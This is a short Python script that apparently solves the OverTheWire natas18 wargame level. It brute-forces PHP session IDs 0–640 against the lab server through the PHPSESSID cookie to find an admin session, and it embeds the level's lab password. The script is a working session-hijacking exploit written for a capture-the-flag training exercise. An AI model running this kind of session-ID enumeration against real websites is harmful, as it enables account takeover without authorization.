import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')

count = 1
max_count = 640

url = "http://natas18.natas.labs.overthewire.org/index.php?debug"


def check_session_id(count: int) -> None:
    cookie = "PHPSESSID=" + str(count)
    headers = {'Cookie': cookie}
    response = requests.get(url, headers=headers,
                            auth=basic_auth, verify=False)

    if "You are logged in as a regular user" not in response.text:
        print(response.text)


if __name__ == '__main__':
    for count in range(max_count + 1):
        check_session_id(count)
